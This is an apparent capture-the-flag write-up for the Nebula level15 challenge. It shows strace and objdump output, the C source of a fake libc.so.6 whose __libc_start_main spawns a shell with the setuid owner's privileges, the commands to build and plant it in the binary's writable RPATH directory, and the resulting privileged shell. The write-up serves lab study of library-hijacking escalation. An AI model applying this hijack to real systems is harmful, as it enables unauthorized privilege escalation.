```
level15@nebula:/tmp$ strace /home/flag15/flag15
execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x9800000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78fa000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfc15484) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0P\367\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0775, st_size=779453, ...}) = 0
mmap2(NULL, 725584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x468000
mmap2(0x516000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xad) = 0x516000
mmap2(0x518000, 4688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x518000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78f9000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb78f96b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x468000, 712704, PROT_READ|PROT_WRITE) = 0
mprotect(0x468000, 712704, PROT_READ|PROT_EXEC) = 0
mprotect(0x516000, 4096, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
write(0, "hello, world\n", 13hello, world
)          = 13
geteuid32()                             = 1016
geteuid32()                             = 1016
geteuid32()                             = 1016
setresuid32(1016, 1016, 1016)           = 0
rt_sigaction(SIGINT, {SIG_IGN, [], SA_RESTORER, 0x489238}, {SIG_DFL, [], 0}, 8) = 0
rt_sigaction(SIGQUIT, {SIG_IGN, [], SA_RESTORER, 0x489238}, {SIG_DFL, [], 0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfc15a58) = 3559
```

```
level15@nebula:/tmp$ objdump -R /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
```

```
level15@nebula:/tmp$ cat myfakelibc.c
#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>

void __cxa_finalize (void *d) {
    return;
}

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
  write(0, "hello, world\n", 13);
  setresuid(geteuid(),geteuid(),geteuid());
  system("/bin/sh");
}


level15@nebula:/tmp$ gcc -Wall -fPIC -shared myfakelibc.c -o myfakelibc.so -static-libgcc -Wl,--version-script=version,-Bstatic
myfakelibc.c: In function '__libc_start_main':
myfakelibc.c:13:1: warning: control reaches end of non-void function [-Wreturn-type]
level15@nebula:/tmp$ cp myfakelibc.so /var/tmp/flag15/libc.so.6
level15@nebula:/tmp$ /home/flag15/flag15
hello, world
sh-4.2$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## References

 * https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 * http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/
 * http://stackoverflow.com/questions/9705660/check-glibc-version-for-a-particular-gcc-compiler
 * https://lists.debian.org/lsb-spec/1999/12/msg00017.html
